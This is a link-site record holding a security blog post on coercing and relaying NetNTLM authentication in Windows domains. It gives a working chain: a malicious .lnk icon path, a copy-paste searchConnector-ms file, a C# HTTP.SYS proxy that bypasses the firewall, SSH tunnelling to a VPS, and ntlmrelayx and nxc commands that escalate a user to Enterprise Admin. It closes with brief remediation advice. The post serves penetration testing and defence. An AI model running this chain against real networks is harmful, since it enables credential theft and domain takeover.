{"aid": "40155224", "title": "NetNTLM is still a thing? \u2013 BadOption.eu", "url": "https://badoption.eu/blog/2024/04/25/netntlm.html", "domain": "badoption.eu", "votes": 1, "user": "moonsword", "posted_at": "2024-04-25 09:17:36", "comments": 0, "source_title": "NetNTLM is still a thing?", "source_text": "NetNTLM is still a thing? | BadOption.eu\n\nBadOption.eu\n\n# NetNTLM is still a thing?\n\nApr 25, 2024 \u2022 PfiatDe\n\nIn 2024 NetNTLM leaking is still a thing! In this post we will cover some\nparts of:\n\n  * Coerce User Authentication via NetNTLM and a file drop\n  * The mystery around HTTP.SYS\n  * Relaying without admin privileges\n  * Relaying with an active Windows firewall\n  * SSH Port forwarding\n\n# Details\n\n## Coerce User Authentication via NetNTLM\n\nA detail from a SO-CON 2024 slidedeck took my attention. (Net)NTLM relaying is\nstill alive?\n\nThe PDF can be found here: Elad Shamir - NTLM The Legacy Protocol That Won\u2019t\nDie / Elad Shamir - NTLM - SO-CON 2024.pdf\n\nSo, what does this mean? If an attacker can drop a hidden authentication\ncoercion file, which is a wonderful way to describe for example a .lnk or a\n.scf file, to a user desktop it will trigger an auth. Even without user\ninteraction, as it typically is for network shares? - Nice\n\nThis could be a nice way for lateral movement, but of course requires local\nadministrative permissions, or a really broken client (yeah, I know, happens\nway too often ...).\n\nA buddy at work (@qtc_de) had a nice little tip for me, when we were talking\nabout possibilities. Instead of dropping files on each user\u2019s desktop, we can\njust drop one in Users\\Public\\Public Desktop and it will immediately be\nsynchronized to all desktops.\n\nOf course there are already some great writeups about this:\n\n  * https://0xdf.gitlab.io/2019/03/09/htb-ethereal.html#visual-studio-2017lnk\n\n  * https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html#creds-for-amanda\n\nFor the coercion part itself, we are going to generate an overly complex lnk\nfile with the icon pointing to a WebDAV resource. For example, NetExec has a\nmodule slinky for it, which just needs some minor adjustment.\n\nThe relevant part of it:\n\n    \n    \n    link = pylnk3.create(self.lnk_path) link.icon = f\"\\\\\\\\{self.server}\\\\icons\\\\icon.ico\" link.save()\n\nWe need an icon path like this:\n\n    \n    \n    \\\\elastic-elastic-dc01\\apps\\icon.ico\n\nWith the lnk dropped to the Public Desktop we can trigger an authentication on\nPort 445 (SMB), which we can farm or relay. However, SMB relaying is not that\nuseful anymore, as most environments have SMB signing enforced. There are of\ncourse some exclusions, ESC8 is still doing great!\n\nPS: The lnk File can also be invisible :)\n\nThere are some really great maps at\nhttps://www.thehacker.recipes/a-d/movement/ntlm/relay:\n\nSource: https://www.thehacker.recipes/a-d/movement/ntlm/relay\n\nSo what can we do to increase the impact of the relaying part?\n\n## WebClient\n\nIf the WebClient is started on a client, we can trigger a coercion via HTTP\n(WebDAV in this case) to any port and path we want to! If you need to refresh\nyour knowledge about that topic look e.g. here.\n\nThe risk that the webclient is not started is uncomfortable, so we just start\nit ourselves, also by dropping a file. This time we need a .searchConnector-ms\nfile. Yeah, that\u2019s a weird filetype...\n\nexample searchConnector-ms file\n\nYeah I honor your time, so here is the content for Copy&Paste.\n\n    \n    \n    <?xml version=\"1.0\" encoding=\"UTF-8\"?> <searchConnectorDescription xmlns=\"http://schemas.microsoft.com/windows/2009/searchConnector\"> <description>Microsoft Outlook</description> <isSearchOnlyItem>false</isSearchOnlyItem> <includeInStartMenuScope>true</includeInStartMenuScope> <templateInfo> <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType> </templateInfo> <simpleLocation> <url>https://whatever/</url> </simpleLocation> </searchConnectorDescription>\n\nDropping this file will start the WebClient service on a client. Note that the\nWebClient is mostly available under Windows 10 & 11, Windows Server needs an\nadditional role installed to have it\n\nWe now adjust our .lnk file to point to a specific port (10247) by adding\n@10247.\n\n    \n    \n    \\\\elastic-elastic-dc01@10247\\apps\\icon.ico\n\nNow, if we have code execution on a Linux box without a firewall we can simply\nuse this. But we want to go a little bit further and exploit this with an\nactive Windows firewall and without admin permissions.\n\n## Break the firewall\n\nIn Windows there is another way to create a webserver than a classic socket\nlistener. Windows does include a Driver, which does the heavy lifting for us\nand allows quite simple web applications.\n\nSource: https://www.codeproject.com/Articles/437733/Demystify-http-sys-with-\nHttpSysManager\n\nAs we all have only limited time, here is the short version.\n\nThe .Net Namespace around this is the System.Net.HttpListener and there is a\nKernel driver doing things for us.\n\nAs it is nice to have a driver do some stuff for us, the bigger benefits are:\n\n  * We can have webserver without admin privileges\n  * We can have webserver with an active Windows Firewall\n\nWait, what? -Correct, there are some paths, which are allowed through the\ndefault configuration of the Windows Firewall, as the HTTP.SYS driver is\nrunning under NT-SYSTEM and it is a trusted application!\n\nMild shock\n\nThe following blog brings some light to it:\nhttps://www.codeproject.com/Articles/437733/Demystify-http-sys-with-\nHttpSysManager\n\nUnfortunately, the code project is gone :\u2019(\n\n  * But wait, aren\u2019t we Hackers? So we use Wayback machine!\n\nhttps://web.archive.org/web/20210629141743/https://archive.codeplex.com/?p=httpsysmanager\n\nLuckily the release was also archived.\n\nThis allows us to use this wonderful tool, without writing all those nasty\nlines of code by ourselves.\n\n### HTTP.SYS ACL\u2019s\n\nLet\u2019s take a look at a Windows 11 System: Checking the HTTP.SYS ACLs on a\nWindows 11\n\nIf we check all those permissions for the URI, we find some interesting ones,\nlike\n\nLax permissions on the :10247/apps path\n\nAuthenticated users? Hey that\u2019s me!\n\nSo every authenticated user can register a listener under\nhttp://<HOST>:10247/apps? Nice, let\u2019s try this.\n\nRunning a listener without admin privileges\n\nAnd as a bonus, this also bypasses the default configuration of the windows\nfirewall! - Cool\n\nTotally fine\n\nOther interesting URI\u2019s are:\n\n  * http://*:5357/\n  * http://*:10246/MDEServer/\n  * http://*:10247/apps/\n  * http://*:80/Temporary_Listen_Addresses/\n  * http://*:5358/\n\nNote: Not all those URIs are also allowed through the firewall!\n\n## Proxying\n\nSo we can have a listener without admin privs and through an active windows\nfirewall. So what\u2019s next? We can proxy those requests and do something else\nwith them.\n\nThere is a useful code snippet on LinkedIn (yeah, I know ...):\n\nhttps://www.linkedin.com/pulse/implementing-proxy-server-c-example-test-case-\nesmael-esmaeli/\n\nThis snippet needs some adjustments to fit our needs. We might come up with\nsomething quick&dirty like this\n\n    \n    \n    using System; using System.Collections.Generic; using System.IO; using System.Linq; using System.Net; using System.Runtime.Remoting.Messaging; using System.Text; using System.Threading.Tasks; namespace Proxy { internal class Program { static void Main(string[] args) { // Create a new HttpListener to listen for requests on the specified UR HttpListener listener = new HttpListener(); listener.Prefixes.Add(\"http://+:80/Temporary_Listen_Addresses/\"); //listener.Prefixes.Add(\"http://+:5357/blub/\"); //listener.Prefixes.Add(\"http://+:5358/blubber/123/\"); listener.Prefixes.Add(\"http://+:10246/MDEServer/\"); listener.Prefixes.Add(\"http://+:10247/apps/\"); listener.AuthenticationSchemes = AuthenticationSchemes.Anonymous; listener.IgnoreWriteExceptions = true; listener.Start(); while (true) { try { // Wait for a request to be made to the server HttpListenerContext context = listener.GetContext(); // Get the request and response objects HttpListenerRequest request = context.Request; HttpListenerResponse response = context.Response; // Modify the request as needed (e.g. to add headers, change the URL, etc.) string newUrl = \"http://elastic-elastic-dc01:8080/icon.ico\"; // Forward the request to the destination server HttpWebRequest destinationRequest = (HttpWebRequest)WebRequest.Create(newUrl); destinationRequest.SendChunked = false; destinationRequest.Method = request.HttpMethod; // Copy the request headers from the original request to the new request Console.WriteLine(\"Request\"); Console.WriteLine(request.Url.ToString()); Console.WriteLine(request.HttpMethod.ToString()); Console.WriteLine(request.Headers.ToString()); foreach (string key in request.Headers.AllKeys) { try { string[] values = request.Headers.GetValues(key); switch (key) { case \"Connection\": if (values[0] == \"Keep-Alive\") { destinationRequest.KeepAlive = true; } else { destinationRequest.Connection = values[0]; } break; case \"Content-Length\": destinationRequest.ContentLength = long.Parse(values[0]); break; case \"Host\": destinationRequest.Host = values[0]; break; case \"User-Agent\": destinationRequest.UserAgent = values[0]; break; default: destinationRequest.Headers.Add(key, values[0].ToString()); break; } } catch (Exception ex) { Console.WriteLine(ex.ToString()); } } Console.WriteLine(\"Forwarded item\"); Console.WriteLine(destinationRequest.RequestUri.ToString()); Console.WriteLine(destinationRequest.Host); Console.WriteLine(destinationRequest.Headers.ToString()); HttpWebResponse destinationResponse; // Get the response from the destination server try { destinationResponse = (HttpWebResponse)destinationRequest.GetResponse(); } catch (WebException wex) { destinationResponse = wex.Response as HttpWebResponse; } Console.WriteLine(\"Response\"); Console.WriteLine(destinationResponse.StatusCode.ToString()); Console.WriteLine(destinationResponse.Headers.ToString()); response.StatusCode = (int)destinationResponse.StatusCode; // Copy the response headers from the destination response to the client response foreach (string key in destinationResponse.Headers.AllKeys) { //response.Headers[header] = destinationResponse.Headers[header]; string[] values = destinationResponse.Headers.GetValues(key); if (key == \"Content-Length\") { ; } else { response.AddHeader(key, values[0]); } } Console.WriteLine(\"Response - Override\"); Console.WriteLine(destinationResponse.StatusCode.ToString()); Console.WriteLine(destinationResponse.Headers.ToString()); response.SendChunked = false; // Get the response stream from the destination response and copy it to the client response using (Stream destinationStream = destinationResponse.GetResponseStream()) { using (Stream outputStream = response.OutputStream) { destinationStream.CopyTo(outputStream); outputStream.Flush(); // You must close the output stream. outputStream.Close(); } } } catch (Exception ex) { Console.Write(ex.ToString()); Console.WriteLine(ex.StackTrace.ToString()); } } listener.Stop(); } } }\n\nWhat is this doing? A ton of debug outputs, some bad practice, and some minor\nfunctions like registering a listener for HTTP.SYS, forward the request to\nanother port, get the response and then deliver the response to the initial\ncaller.\n\nSo what can we do with this? We can combine it with an old friend!\n\nOld friend for the rescue\n\nNote: SSH is only an easy option. There are way better possibilities like\nusing ironpython, python.net or do the relaying directly in C#.\n\n## Good ol\u2019 SSH\n\nWe can dome some nice little port forwarding on the same machine to tunnel the\ntraffic to a system we fully control and then send it back.\n\n    \n    \n    ssh -L 10.3.10.12:8080:10.3.10.11:80 -R 127.0.0.1:9050 debian@10.3.10.11\n\nWhy is this useful? As Windows also offers native SSH capabilities, we can use\nthe standard windows client for SSH port forwarding to a server in the\ninternet (-L 10.3.10.12:8080:10.3.10.11:80), have ntlmrelayx running there and\ntunnel the traffic back via a SOCKS (-R 127.0.0.1:9050). Note: the target\nserver does not need to be in the same network if SSH outgoing is allowed,\nmeaning it can be a VPS or whatever\n\n### Farm NetNTLM Hashes\n\nBy proxying the request and using SSH Port forwarding, we can e.g. run\nresponder on the VPS to get some hashes.\n\nFarming some hashes for cracking\n\nThis is for sure nice, but if we just would want the hashes, we could have\ndone this direct in the C# code like MDSec\u2019s Farmer is doing here.\n\nBut the bigger / better part is quite often relaying!\n\n## Relay it\n\nLet\u2019s go a little bit through the relaying steps.\n\n### Start ntlmrelayx on the VPS\n\nwith proxychains and -smb2support. In this example, we are going to relay\nagainst the LDAP service, as it is still common to have no Channel binding and\nno LDAP Signing.\n\nRelaying to LDAP is powerfull, but not the only choice. For example an\ninteractive shell (-i) with ntlmrelayx against a fileshare or some HTTP\nendpoint is also great\n\n    \n    \n    proxychains sudo ntlmrelayx.py -debug -smb2support -t \"LDAP://10.3.10.12\" --escalate-user domainuser --http-port 80\n\n### Create the SSH tunnel on the client\n\nwith the two different port forwardings\n\n    \n    \n    ssh -L 10.3.10.12:8080:10.3.10.11:80 -R 127.0.0.1:9050 debian@10.3.10.11\n\n### Start the ProxyApp on the client\n\nwhich registers at HTTP.SYS and will forward the request to port 8080 locally\n\n### Drop a .searchConnectors-ms file on the victim system\n\nto ensure that the WebClient is running\n\n### Drop a .lnk file on the victim system\n\nto actually coerce the authentication to our client\n\n    \n    \n    nxc smb 10.3.10.21 -d \"ludus\" -u \"localadmin\" -p \"password\" -M slinky -o NAME='\\\\users\\\\public\\\\desktop\\\\SHARE62' SERVER=\"elastic-elastic-dc01@10247\\apps\"\n\nNote: The slightly strange parameters just make it to\nC:\\users\\public\\desktop\\Share63.lnk and \\\\\\elastic-elastic-dc01@10247\\apps. I\nmight make the PR for nxc in a while to clean this a little bit.\n\nAnd Ta-da, this actually made us an Enterprise Admin.\n\nSucessful relaying\n\nThe flow looks like this: Attack flow\n\n## PoC\n\n\u201cQuick\u201d Walkthrough\n\n# Bonus\n\nI know this was a lengthy post, but you almost made it. As you kept scrolling\nuntil here, there is a little bonus. You can also coerce via embedded <img>\ntags in emails. Outlook will happily authenticate it against a network path\nif:\n\n  * The target system is in the trusted zone, typically meaning without a \u201c.\u201d in the name\n  * The sender of the email is a trusted sender.\n\nAll emails coming from the same domain are typically trusted senders, so if\nyou got a trainee account, you are a trusted sender for the domain admin :)\n\nBonus PoC Walkthrough\n\n# Remediation\n\n  * Harden the firewall config\n  * Harden LDAP (Channel Bindung / Signing)\n  * Ensure SMB Signing is enforced\n  * Remove all those ESC8\u2019s\n  * Never ever use high priv accounts to get e-mails!\n\nSubscribe\n\nJust Infosec stuff, with blogs and a feed.\n\n", "frontpage": false}
